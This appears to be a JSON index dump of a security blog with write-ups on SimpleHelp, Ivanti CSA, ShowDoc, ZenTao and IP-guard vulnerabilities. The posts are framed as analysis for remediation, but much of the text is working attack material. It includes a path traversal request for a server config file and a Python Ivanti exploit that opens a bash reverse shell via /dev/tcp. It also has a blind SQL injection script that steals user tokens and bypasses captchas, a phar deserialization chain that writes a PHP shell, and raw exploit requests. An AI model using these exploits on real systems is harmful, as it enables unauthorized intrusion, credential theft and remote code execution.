“randomStr”resourcePath = “/../../configuration/serverconfig.xml”However, the payload at this point is still not directly usable. The reason is that our itemID needs to be concatenated with configuration/toolbox-resources in ToolBoxConstants in actual application.File resourceFile = ToolBoxConstants.getResourceFile(itemID, resourceID);         if (resourcePath != null) {            resourceFile = new File(resourceFile, resourcePath);         }// ToolBoxConstants.classpublic class ToolBoxConstants {   public static final File RESOURCES_FOLDER = new File(\"configuration/toolbox-resources\");   public static File getToolBoxItemFolder(String itemID) {      return new File(RESOURCES_FOLDER, itemID);   }   public static File getResourceFile(String itemID, String resourceID) {      File itemFolder = getToolBoxItemFolder(itemID);      return new File(itemFolder, resourceID);   }Modify the payload:GET /toolbox-resource/../randomStr/../../configuration/serverconfig.xml HTTP/1.1Host: localhostThrough the above modifications, the payload can correctly concatenate with the path in ToolBoxConstants, thereby successfully exploiting the vulnerability to obtain the target file.References      CVE-2024-57727 Simple Help Unauthenticated Path Traversal Vulnerability        Simple Help Security Vulnerabilities 01-2025        horizon3: Critical Vulnerabilities in SimpleHelp Remote Support Software  "
  },
  
  {
    "title": "Vulnerability Review:Ivanti CSA Exploits Authentication Bypass (CVE-2024-8963) and Command Injection (CVE-2024-8190)",
    "url": "/posts/ivanti-csa/",
    "categories": "vulnerability, IVanti",
    "tags": "IVanti",
    "date": "2024-11-06 12:13:00 +0800",
    





    
    "snippet": "OverviewIvanti CSA is a unified endpoint management platform that provides a comprehensive suite of tools for managing and securingdevices, applications, and data across an organization’s network. ...",
    "content": "OverviewIvanti CSA is a unified endpoint management platform that provides a comprehensive suite of tools for managing and securingdevices, applications, and data across an organization’s network. It offers features such as asset management, softwaredeployment, remote control, and security policies to ensure compliance and protect against cyber threats.In the most recent security research, Fortinet exposed a sophisticated cyberattack targeting Ivanti Cloud Services Appliance (CSA), which involved two previously unknown zero-day vulnerabilities [1]. This article thoroughly explores how attackers skillfully linked these vulnerabilities to gain initial access to the victims’ networks, highlighting the complexity and stealth of cyber threats.The article emphasizes that the affected platforms are Ivanti CSA versions 4.6 and prior, meaning any organization using these versions could be at risk. A successful attack could result in remote attackers taking control of vulnerable systems, with the impact and severity level rated as “severe.”            Vulnerability ID      Vulnerability Type      Public Status      Disclosure Date      Affected Component      Description                  CVE-2024-8190      Command Injection Vulnerability      Publicly Disclosed      2024-09-10      /gsb/datetime.php      Affects CSA versions 4.6 and earlier, allowing attackers to execute command injection attacks.              CVE-2024-8963      Path Traversal Vulnerability      Not Publicly Disclosed      2024-09-19      /client/index.php      Allows attackers to access unauthorized resources through path traversal, such as users.php, etc.              CVE-2024-9380      Command Injection Vulnerability      Not Publicly Disclosed      2024-10-08      /gsb/reports.php      Affects the reports.php resource, allowing attackers to execute command injection attacks.      Horizon3.ai publicly disclosed the command injection vulnerability CVE-2024-8190 in Ivanti Cloud Service Appliance (CSA) on September 10, 2024. Subsequently, Fortinet publicly disclosed two other severe vulnerabilities, CVE-2024-8963 and CVE-2024-9380, on October 8, 2024. Although details and exploit code for CVE-2024-8190 have been made public, there is a relative scarcity of detailed information and analysis materials regarding CVE-2024-8963. Therefore, I have decided to reproduce the vulnerability in Ivanti CSA version 4.6, conduct an in-depth analysis of CVE-2024-8963, and on this basis, discuss methods of exploiting the vulnerability and escalating privileges. Given that these vulnerabilities have been exploited by multiple organizations, the purpose of this article is to alert relevant personnel to pay sufficient attention to these vulnerabilities and to take prompt action for remediation in order to prevent potential security threats.Technical AnalysisAuthentication BypassAccording to the CSA setup tutorial, you can quickly build a vulnerability analysis lab environment. Once all preparations are complete, by executing the netstat command, you can observe that the CSA Web service is provided by Broker, which is a Web service component implemented by CSA itself. When accessing PHP resources, Broker will start a php-cgi process to handle the request.[root@localhost ~]# netstat -punta | grep LISTENtcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      1482/broker         tcp        0      0 192.168.32.127:80       0.0.0.0:*               LISTEN      1482/broker         tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1462/dnsmasq        tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1002/sshd           tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      1029/postmaster     tcp        0      0 127.0.0.1:443           0.0.0.0:*               LISTEN      1482/broker         tcp        0      0 192.168.32.127:443      0.0.0.0:*               LISTEN      1482/broker         tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           tcp6       0      0 :::22                   :::*                    LISTEN      1002/sshd  The Web directory structure of CSA is shown in the figure. Each request is not directly handled by php-cgi, but first goes through an authentication process. The permissions for accessing the corresponding directories are defined by the vroot file.[root@localhost webroot]# pwd/opt/landesk/broker/webroot[root@localhost webroot]# lsallowed  backups  backups.vroot  cba8.crt  client  client.vroot  gsb  gsbweb.vroot  images  index.tmpl  ldmg.ico  lib  local.vroot  mg.crt  rc  rc.vroot  upload  upload.vroot.unusedIn the client.vroot file, the allowedMethods element defines the allowed HTTP request methods, which are limited to GET and HEAD requests. This ensures that clients can only access resources through these two methods, thereby limiting the operational permissions on server resources. The handler element specifies that the handler for .php files is CGI, and sets the path of the CGI handler to /usr/bin/php-cgi, allowing the server to correctly execute PHP scripts. The authenticate element is set to none, indicating that no authentication is required for users accessing this directory, allowing all users to access the resources in the directory without logging in.&lt;application&gt;        &lt;environment&gt;                &lt;APPLICATION_ROOT&gt;/gsb&lt;/APPLICATION_ROOT&gt;        &lt;/environment&gt;        &lt;index&gt;                &amp;lt;a href=\"http:///client/\"&amp;gt;Cloud Services Appliance Utilities&amp;lt;/a&amp;gt;                &amp;lt;br&amp;gt;                &amp;lt;a href=\"http:///client/LDMGdeploy.pdf\"&amp;gt;User's Guide&amp;lt;/a&amp;gt;        &lt;/index&gt;        &lt;directory&gt;                &lt;root&gt;/client&lt;/root&gt;                &lt;location&gt;/opt/landesk/broker/webroot&lt;/location&gt;                &lt;directoryDefault&gt;/client/index.php&lt;/directoryDefault&gt;                &lt;authenticate&gt;none&lt;/authenticate&gt;                &lt;protocol&gt;BOTH&lt;/protocol&gt;                &lt;showDir&gt;1&lt;/showDir&gt;                &lt;allowedMethods&gt;                        &lt;verb&gt;GET&lt;/verb&gt;                        &lt;verb&gt;HEAD&lt;/verb&gt;                &lt;/allowedMethods&gt;                &lt;map&gt;                        &lt;spec&gt;*.php&lt;/spec&gt;                        &lt;handler&gt;CGI&lt;/handler&gt;                        &lt;path&gt;/usr/bin/php-cgi&lt;/path&gt;                &lt;/map&gt;                &lt;hide&gt;                        &lt;spec&gt;*.desc&lt;/spec&gt;                        &lt;spec&gt;*.conf&lt;/spec&gt;                &lt;/hide&gt;        &lt;/directory&gt;&lt;/application&gt;In the gsbweb.vroot file, the allowedMethods element defines restrictions on HTTP request methods for different resources: for the favicon.ico file, only GET requests are allowed, ensuring that clients can only retrieve the icon file; for the /gsb directory, GET, POST, and HEAD requests are permitted, allowing users to retrieve resources, submit data, and obtain metadata about the resources. The handler element specifies that .php files are processed by the CGI handler, with the path set to /usr/bin/php-cgi, ensuring that PHP scripts can be executed correctly. The authenticate element is set to AdminLocalNoauth for the /gsb directory, meaning that access to this directory requires specific local administrator authentication without full identity verification. This could be a special permission control strategy, allowing only certain local administrator users to access it without going through a complete authentication process.&lt;application&gt;        &lt;environment&gt;                &lt;APPLICATION_ROOT&gt;/gsb&lt;/APPLICATION_ROOT&gt;        &lt;/environment&gt;        &lt;index&gt;&amp;lt;a href=\"https:///gsb/\"&amp;gt;Cloud Services Appliance Console&amp;lt;/a&amp;gt;&lt;/index&gt;        &lt;file&gt;                &lt;root&gt;/favicon.ico&lt;/root&gt;                &lt;location&gt;/opt/landesk/broker/webroot&lt;/location&gt;                &lt;protocol&gt;BOTH&lt;/protocol&gt;                &lt;allowedMethods&gt;                        &lt;verb&gt;GET&lt;/verb&gt;                &lt;/allowedMethods&gt;        &lt;/file&gt;        &lt;directory&gt;                &lt;root&gt;/gsb&lt;/root&gt;                &lt;location&gt;/opt/landesk/broker/webroot&lt;/location&gt;                &lt;directoryDefault&gt;/gsb/index.php&lt;/directoryDefault&gt;                &lt;authenticate&gt;AdminLocalNoauth&lt;/authenticate&gt;                &lt;protocol&gt;HTTPSWithHTTPLocal&lt;/protocol&gt;                &lt;showDir&gt;1&lt;/showDir&gt;                &lt;allowedMethods&gt;                        &lt;verb&gt;GET&lt;/verb&gt;                        &lt;verb&gt;POST&lt;/verb&gt;                        &lt;verb&gt;HEAD&lt;/verb&gt;                &lt;/allowedMethods&gt;                &lt;map&gt;                        &lt;spec&gt;*.php&lt;/spec&gt;                        &lt;handler&gt;CGI&lt;/handler&gt;                        &lt;path&gt;/usr/bin/php-cgi&lt;/path&gt;                &lt;/map&gt;        &lt;/directory&gt;&lt;/application&gt;By performing reverse engineering analysis on Broker, one can carefully craft an attack payload as shown in the figure to trigger an authentication bypass vulnerability.Broker executes the php-cgi program using the execve function and passes request information such as script_name and path_info as environment variables to php-cgi. This mechanism allows php-cgi to obtain the relevant request information during execution, enabling it to correctly process the request and generate the appropriate response content.PATH_INFO \t/gsb/index.phpPATH_TRANSLATED \t/opt/landesk/broker/webroot/gsb/index.phpSCRIPT_NAME \t/client/index.php According to the source code of php-cgi, it can be seen that it determines the full path of the currently executing script by obtaining the environment variable SCRIPT_FILENAME. Under normal circumstances, this value is passed to the CGI program by the Web server, indicating the file path of the PHP script to be executed. However, in some cases, if SCRIPT_FILENAME does not have a value, php-cgi will use PATH_TRANSLATED as the script path.For Broker, when executing php-cgi, it passes environment variables through the execve function, but does not set SCRIPT_FILENAME. In this case, php-cgi may rely on PATH_TRANSLATED to determine the script path.Command InjectionCVE-2024-8190According to the analysis of CVE-2024-8190 by horizon3, in the datetime.php file, when the dateTimeFormSubmitted parameter meets certain conditions, it calls the handleDateTimeSubmit method in DateTimeTab.php. This method passes the unfiltered $TIMEZONE parameter to the setSystemTimeZone method, allowing malicious input to be executed by the exec() function, thereby causing a command injection vulnerability. However, the exploit script provided by horizon3 requires authentication.To achieve unauthenticated command execution, the vulnerability can be combined with an authentication bypass vulnerability.import reimport requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxy = {}def exploit(url, command):    s = requests.Session()    r = s.get(f\"{url}/client/index.php/gsb/datetime.php\", verify=False, proxies=proxy)    m = re.search(r\"name=['\\\"]LDCSA_CSRF['\\\"]\\s+value=['\\\"]([^'\\\"]+)['\\\"]\", r.text)    if m:        ldcsa = m.group(1)        print(f\"[+] Got LDCSA_CSRF value: {ldcsa}\")    else:        print(f\"[-] Failed getting LDCSA_CRSF token\")        sys.exit(0)    payload = {        \"dateTimeFormSubmitted\": \"1\",        \"TIMEZONE\": f\"; `{command}` ;\",        \"CYEAR\": \"2024\",        \"CMONTH\": \"9\",        \"CDAY\": \"13\",        \"CHOUR\": \"12\",        \"CMIN\": \"34\",        \"LDCSA_CSRF\": ldcsa,        \"SUBMIT_TIME\": \"Save\"    }    print(f\"[*] Sending payload...\")    r = s.post(f\"{url}/client/index.php/gsb/datetime.php\", verify=False, data=payload, proxies=proxy)exploit(\"https://192.168.32.127\", \"bash -i &gt;&amp; /dev/tcp/192.168.32.128/4444 0&gt;&amp;1\")Privilege EscalationAccording to Fortinet’s analysis of CVE-2024-8190, there is another command execution vulnerability in reports.php, which has root privileges. When the page loads, the showFilesLog method is called, which ultimately invokes the exec function to execute the tripwire command with sudo privileges. Although the input data is filtered using escapeshellarg, when it is passed to the update function of tripwire, parameter concatenation still occurs, leading to command execution.class page extends GWSitePage{  function __construct( $config )  {    parent::__construct( $config );        $a = new reportsTab(\"t1\",\"Reports\");    $this-&gt;addPane( $a );     $this-&gt;setDefaultPane( \"t1\" );  }  function displayHilites()  {    print(getString('WEB_REPORTS_BROKER_HELP'));  }}$page = new page($config);However, this vulnerability cannot be exploited in conjunction with an authentication bypass vulnerability, as it presupposes that the attacker already has a valid account. To this end, I have devised the following method to exploit the vulnerability:      Obtain CSA backup file: First, use the CVE-2024-8190 vulnerability to successfully acquire the backup file of the CSA (Ivanti Cloud Service Appliance). This backup file contains key data and configuration information of the CSA, laying the foundation for subsequent operations.        Import local simulation environment and create an account: Import the obtained target backup file into the locally built CSA simulation environment. Use the command-line tool /opt/landesk/broker/dbtool to create an account with administrative privileges in the simulation environment. This step allows us to have higher operational permissions in the simulation environment, preparing for further vulnerability exploitation.        Export backup and extract SQL statement: Perform a backup operation in the local simulation environment to export a new backup file. Carefully analyze this backup file and precisely extract the SQL statement used when creating the user. This SQL statement contains key information required to create an administrative account, such as the username and password.        Execute SQL statement using CVE-2024-8190: Use the extracted SQL statement as a parameter and exploit the CVE-2024-8190 vulnerability again to execute the SQL statement in the real target CSA environment. In this way, an administrative account is successfully created in the target CSA, bypassing the original authentication restrictions.        Log in with the user and execute the privilege escalation vulnerability: Log in to the CSA with the newly created administrative account, which now has higher operational permissions. Then, execute known privilege escalation vulnerability exploitation methods to further elevate privileges and gain the highest level of system control.  Reference[1] https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa[2] https://www.horizon3.ai/attack-research/cisa-kev-cve-2024-8190-ivanti-csa-command-injection[3] https://www.youtube.com/watch?v=f3bP-wm5tJA[4] https://download.ivanti.com/product/CSA/46/ldcsa-scsi-csrffix.iso[5] https://github.com/hoohack/read-php-src/blob/36c410bfe7f8afce9aff92fb196e4243984491cb/php-5.4/sapi/cgi/cgi_main.c#L1146"
  },
  
  {
    "title": "ShowDoc Sql Injection and Remote Code Execution",
    "url": "/posts/showdoc-sql-injection-and-rce/",
    "categories": "vulnerability, ShowDoc",
    "tags": "ShowDoc",
    "date": "2024-06-02 12:13:00 +0800",
    





    
    "snippet": "OverviewShowDoc is a versatile online documentation tool tailored for IT teams, perfect for creating beautiful API documents,tech manuals, and more using markdown. Its features include automated do...",
    "content": "OverviewShowDoc is a versatile online documentation tool tailored for IT teams, perfect for creating beautiful API documents,tech manuals, and more using markdown. Its features include automated document generation from code comments or via theRunApi client, multi-platform support, and robust team collaboration tools. Widely adopted by over 100,000 internetteams, including major corporations, ShowDoc offers both public and private project options, extensive editcapabilities, and responsive design for easy access across devices.Technical AnalysisThe developers of ShowDoc fixed an SQL injection vulnerability in the pwd function related to the item_id parameterinserver/Application/Api/Controller/ItemController.class.php inversion v3.2.6[1].They also fixed a deserialization vulnerability caused by the new_is_writeable functionin server/Application/Home/Controller/IndexController.class.php inversion v3.2.5[2].Sql InjectionThe pwd function in server/Application/Api/Controller/ItemController.class.php is vulnerable to SQL injection.The item_id parameter is not properly sanitized, allowing an attacker to inject arbitrary SQL code.public function pwd() {    $item_id = I(\"item_id\");    $page_id = I(\"page_id/d\");    $password = I(\"password\");    $refer_url = I('refer_url');    $captcha_id = I(\"captcha_id\");    $captcha = I(\"captcha\");    //  -- snip --    $item = D(\"Item\")-&gt;where(\"item_id = '$item_id' \")-&gt;find();  // Sql Injection    if ($password &amp;&amp; $item['password'] == $password) {        session(\"visit_item_\" . $item_id, 1);        $this-&gt;sendResult(array(\"refer_url\" =&gt; base64_decode($refer_url)));    } else {        $this-&gt;sendError(10010, L('access_password_are_incorrect'));    }}ShowDoc is a secondary development based on ThinkPHP3.2.3, which can directly obtain the value of item_idusing I(\"item_id\").We can quickly set up a ShowDoc environment using Docker, as shown below, and send a POST request to test for SQLinjection.sudo docker run -d --name showdoc \\                                --user=root --privileged=true \\  -p 4999:80 \\          -v /showdoc_data/html:/var/www/html/ \\star7th/showdoc:v3.2.4POST /server/index.php?s=/api/Item/pwd HTTP/1.1Host: 192.168.32.128:4999User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0Accept-Encoding: gzip, deflate, brAccept: application/json, text/plain, */*Connection: keep-aliveAccept-Language: en-US,en;q=0.5Content-Type: application/x-www-form-urlencodedOrigin: http://192.168.32.128:4999Referer: http://192.168.32.128:4999/web/Pragma: no-cacheCache-Control: no-cacheCookie: PHPSESSID=04d3132934531e78f6608229071059ac; think_language=en-USContent-Length: 254item_id=%27+OR+1%3D%28case+when%28substr%28%28select+token+from+user_token+where+uid%3D1%29%2C1%2C1%29%3D%272%27%29+then+randomblob%281000000000%29+else+0+end%29+OR%271%27%3D%271&amp;page_id=123123&amp;password=12312&amp;refer_url=123123&amp;captcha_id=6138&amp;captcha=e863And I have written a script to obtain the token through time-based blind injection and recognize the captcha throughdddocr.import timeimport onnxruntimeimport requestsimport ddddocrsession = requests.session()chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',         'l',         'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']token = ['+'] * 64def inject(url):  global session  i = 1  while True:    if i &gt; 64:      break    for c in chars:      captcha_str, captcha_id = show_captcha(url)      burp0_url = f\"{url}/server/index.php?s=/api/Item/pwd\"      burp0_headers = {        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\",        \"Accept\": \"application/json, text/plain, */*\", \"Accept-Language\": \"en-US,en;q=0.5\",        \"Accept-Encoding\": \"gzip, deflate, br\", \"Content-Type\": \"application/x-www-form-urlencoded\",        \"Origin\": url, \"Connection\": \"keep-alive\",        \"Referer\": f\"{url}/web/\", \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\"}      burp0_data = {        \"item_id\": f\"' OR 1=(case when(substr((select token from user_token where uid=1),{i},1)='{c}') then randomblob(1000000000) else 0 end) OR'1'='1\",        \"page_id\": \"123123\", \"password\": \"12312\", \"refer_url\": \"123123\", \"captcha_id\": captcha_id,        \"captcha\": captcha_str}      start_time = time.time()      session.post(burp0_url, headers=burp0_headers, data=burp0_data)      end_time = time.time()      if end_time - start_time &gt; 1:        token[i - 1] = c        print(\"\".join(token))        break    if token[i - 1] == '+':      time.sleep(5)    else:      i += 1    time.sleep(1)def create_captcha(url) -&gt; str:  global session  burp0_url = f\"{url}/server/index.php?s=/api/common/createCaptcha\"  burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\",                   \"Accept\": \"application/json, text/plain, */*\", \"Accept-Language\": \"en-US,en;q=0.5\",                   \"Accept-Encoding\": \"gzip, deflate, br\", \"Content-Type\": \"application/x-www-form-urlencoded\",                   \"Origin\": url, \"Connection\": \"keep-alive\",                   \"Referer\": f\"{url}/web/\"}  try:    res = session.post(burp0_url, headers=burp0_headers)    data = res.json()    if res.status_code == 200 and data['error_code'] == 0:      return data['data']['captcha_id']  except Exception as e:    pass  return \"\"def captcha(img_bytes):  ocr = ddddocr.DdddOcr(show_ad=False)  onnxruntime.set_default_logger_severity(3)  res = ocr.classification(img_bytes)  return resdef show_captcha(url):  global session  captcha_id = create_captcha(url)  burp0_url = f\"{url}/server/index.php?s=/api/common/showCaptcha&amp;captcha_id={captcha_id}\"  burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0\",                   \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",                   \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate, br\",                   \"Connection\": \"keep-alive\", \"Upgrade-Insecure-Requests\": \"1\", \"Priority\": \"u=1\"}  try:    res = session.get(burp0_url, headers=burp0_headers)    if res.status_code == 200:      return captcha(res.content), captcha_id  except Exception as e:    print(e)  return None, Noneif __name__ == '__main__':  import sys  inject(sys.argv[1])# pip install ddddocr# Example: python exp.py target_urlDeserializationAccording to the patch information, it can be seen that new_is_writeable has been changed to private. Before themodification, it could be accessed via /server/index.php?s=/home/index/new_is_writeable&amp;file=file_path, where the fileparameter is controllable. This parameter accepts a file path and uses fopen to open it.So, we inject a phar file to trigger deserialization[5]. Phar files (PHP archives) contain metadata in serializedformat, so during parsing, this metadata will be deserialized. You can try to exploit deserialization vulnerabilities inPHP code. The best thing about this feature is that deserialization will occur even with PHP functions that do notexecute PHP code, such as file_get_contents(), fopen(), file(), file_exists(), md5_file(), filemtime(), or filesize().Then, we need a POP chain, which we can refer to [6]. Showdoc uses Guzzle, and we can generate a phar file usingthe following code.&lt;?phpnamespace GuzzleHttp\\Cookie{    class SetCookie{        private $data=array();        public function __construct(){            $this-&gt;data = array(                'Expires' =&gt; 1,                'Discard' =&gt; null,                'Value' =&gt; '&lt;?php phpinfo();?&gt;'            );        }    }    class CookieJar{        private $strictMode = null;        private $cookies =array();        public function __construct(){            $o = new SetCookie();            $this-&gt;cookies = array($o);        }    }    class FileCookieJar extends CookieJar{        private $filename = '/var/www/html/Sqlite/shell.php';    }}namespace{    $obj = new GuzzleHttp\\Cookie\\FileCookieJar();    @unlink('bb.phar');    $phar = new Phar('bb.phar');    $phar-&gt;startBuffering();    $phar-&gt;setStub(\"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;\");    $phar-&gt;setMetadata($obj);    $phar-&gt;addFromString(\"test.txt\",\"test\");    $phar-&gt;stopBuffering();}File UploadFinally, we can register an account (registration is enabled by default) and log in to the backend to upload thephar file, or use the aforementioned SQL injection vulnerability to obtain a user_token and upload the phar file viathe /api/page/uploadImg API.POST /server/index.php?s=/api/page/uploadImg&amp;user_token=9655f4241d296562d5d98dff872a6c2b6b81976620c90e0c2b0fdf9f8eeceb7d&amp;guid=1718689767541 HTTP/1.1Host: 192.168.32.128:4999User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------59380597416901700852304980266Content-Length: 748Origin: http://192.168.32.128:4999Connection: keep-aliveReferer: http://192.168.32.128:4999/web/Upgrade-Insecure-Requests: 1Priority: u=4-----------------------------59380597416901700852304980266Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.png\"Content-Type: image/pngGIF89a&lt;?php __HALT_COMPILER(); ?&gt;½\u0001After we successfully upload the file, we can obtain the link to the file. Then, we access the new_is_writeableinterface to trigger it.Reference[1] https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda[2] https://github.com/star7th/showdoc/commit/805983518081660594d752573273b8fb5cbbdb30[3] https://www.cnblogs.com/CoLo/p/16786626.html#%E8%B7%AF%E7%94%B1[4] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md[5] https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization[6] https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/gadgets.php"
  },
  
  {
    "title": "Zentao Authentication Bypass",
    "url": "/posts/zentao-auth-bypass/",
    "categories": "vulnerability, Zentao",
    "tags": "",
    "date": "2024-04-26 12:13:00 +0800",
    





    
    "snippet": "OverviewZenTao is a widely used open-source project management software that offers functionalities like project management,product management, test management, document management, bug management,...",
    "content": "OverviewZenTao is a widely used open-source project management software that offers functionalities like project management,product management, test management, document management, bug management, task management, and team collaboration.Before version 18.12 of ZenTao, there was an authentication bypass vulnerability, which could be exploited by attackersto bypass authentication and access sensitive information.according to the public information[1], this vulnerability bypassed the API’s permission check, allowing unauthorizedusers to bypass authentication and access sensitive information, and obtain administrator permissions.Technical AnalysisAuthentication BypassAccording to the commit records of the project [2][3], the code for permission checks was modified twice in the fileframework/api/entry.class.php. It was ultimately changed to if(!$this-&gt;loadModel('user')-&gt;isLogon()), which meansthatin the original code, setting $this-&gt;app-&gt;user was enough to bypass the permission checks.commit d13ba70016ca981b08f27e08fb934bf1f23a4135Author: 宋辰轩 &lt;songchenxuan@easycorp.ltd&gt;Date:   Thu Apr 11 13:26:20 2024 +0800    * Use user login function.diff --git a/framework/api/entry.class.php b/framework/api/entry.class.phpindex e74c9fc33a..74701078c6 100644--- a/framework/api/entry.class.php+++ b/framework/api/entry.class.php@@ -20,7 +20,7 @@ class entry extends baseEntry         if($this-&gt;app-&gt;action == 'options') throw EndResponseException::create($this-&gt;send(204));-        if(!isset($this-&gt;app-&gt;user-&gt;account) or $this-&gt;app-&gt;user-&gt;account == 'guest') throw EndResponseException::create($this-&gt;sendError(401, 'Unauthorized'));+        if(!$this-&gt;loadModel('user')-&gt;isLogon()) throw EndResponseException::create($this-&gt;sendError(401, 'Unauthorized'));         $this-&gt;dao = $this-&gt;loadModel('common')-&gt;dao;     }commit 695055c6b1d2e6a8c944bdbc38308c06820c40ceAuthor: 宋辰轩 &lt;songchenxuan@easycorp.ltd&gt;Date:   Wed Apr 10 15:07:20 2024 +0800    * Fix bug for api priv check.diff --git a/framework/api/entry.class.php b/framework/api/entry.class.phpindex 08eefb189a..e74c9fc33a 100644--- a/framework/api/entry.class.php+++ b/framework/api/entry.class.php@@ -20,7 +20,7 @@ class entry extends baseEntry         if($this-&gt;app-&gt;action == 'options') throw EndResponseException::create($this-&gt;send(204));-        if(!isset($this-&gt;app-&gt;user) or $this-&gt;app-&gt;user-&gt;account == 'guest') throw EndResponseException::create($this-&gt;sendError(401, 'Unauthorized'));+        if(!isset($this-&gt;app-&gt;user-&gt;account) or $this-&gt;app-&gt;user-&gt;account == 'guest') throw EndResponseException::create($this-&gt;sendError(401, 'Unauthorized'));         $this-&gt;dao = $this-&gt;loadModel('common')-&gt;dao;     }By searching, we can find the code segment that sets $this-&gt;app-&gt;user, as shown below:In the deny function of /module/testcase/model.php, we can see that $this-&gt;app-&gt;user is setto $this-&gt;session-&gt;user, as shown below:public function deny($module, $method, $reload = true)    {        if($reload)        {            /* Get authorize again. */            $user = $this-&gt;app-&gt;user;            $user-&gt;rights = $this-&gt;loadModel('user')-&gt;authorize($user-&gt;account);            $user-&gt;groups = $this-&gt;user-&gt;getGroups($user-&gt;account);            $user-&gt;admin  = strpos($this-&gt;app-&gt;company-&gt;admins, \",{$user-&gt;account},\") !== false;            $this-&gt;session-&gt;set('user', $user);            $this-&gt;app-&gt;user = $this-&gt;session-&gt;user;            if(commonModel::hasPriv($module, $method)) return true;        }# -- snip --Therefore, as long as you can call $this-&gt;loadModel('common')-&gt;deny with reload set to true, a session ID can begenerated.Therefore, based on the constructor method of the testcase class, we can construct a request to obtain a session ID.GET /zentao/testcase-getXmindImport-1-1.html?onlybody=yes HTTP/1.1Host: 192.168.32.128User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Priority: u=1Pragma: no-cacheCache-Control: no-cacheGET /zentao/testcase-showXmindImport-1-1.html?onlybody=yes HTTP/1.1Host: 192.168.32.128User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Priority: u=1Pragma: no-cacheCache-Control: no-cacheGET /zentao/testcase-saveXmindImport-1-1.html?onlybody=yes HTTP/1.1Host: 192.168.32.128User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Priority: u=1Pragma: no-cacheCache-Control: no-cacheProof of Conceptdocker run -d  -p 80:80 -p 3306:3306 \\        -e ADMINER_USER=\"root\" -e ADMINER_PASSWD=\"password\" \\        -e BIND_ADDRESS=\"false\" \\        -v /data/zbox/:/opt/zbox/ \\        --add-host smtp.exmail.local.com:127.0.0.1 \\        --name zentao-server \\        idoop/zentao:18.9Reference[1] https://mp.weixin.qq.com/s/HENPEOkpmvOn8kAnZ5e4AQ[2] https://github.com/easysoft/zentaopms/commit/695055c6b1d2e6a8c944bdbc38308c06820c40ce[3] https://github.com/easysoft/zentaopms/commit/d13ba70016ca981b08f27e08fb934bf1f23a4135[4] https://github.com/easysoft/zentaopms/tree/18.x"
  },
  
  {
    "title": "IP-guard Authentication Bypass",
    "url": "/posts/ip-guard-auth-bypass/",
    "categories": "vulnerability, IP-guard",
    "tags": "",
    "date": "2024-04-17 12:13:00 +0800",
    





    
    "snippet": "OverviewIP-guard is an enterprise information supervision system developed by a Chinese company. It is a simple, easy-to-use,and fully functional computer monitoring and control tool that prevents ...",
    "content": "OverviewIP-guard is an enterprise information supervision system developed by a Chinese company. It is a simple, easy-to-use,and fully functional computer monitoring and control tool that prevents internal documents from being copied byrestricting the use of mobile storage devices and applications. This facilitates enterprise control over the flow ofinformation, effectively safeguards corporate information assets, and records detailed operations, printing, andcorresponding screen recordings to help businesses promptly identify misconduct, minimize losses, and preserve evidence.Before version 4.82.0609.0, the product had a permission bypass vulnerability that allowed unauthorized visitors tobypass permissions and read system files.Technical AnalysisAuthentication BypassIP-guard is a web application based on CodeIgniter, a PHP framework. The application uses the following URL format:http://example.com/index.php/controller/method/param1/param2/...Upon reviewing the source code, we discovered that within the mApplyList controller, the system retrieves the method name of the request through the $func variable and then checks whether the user is logged in. If the user is 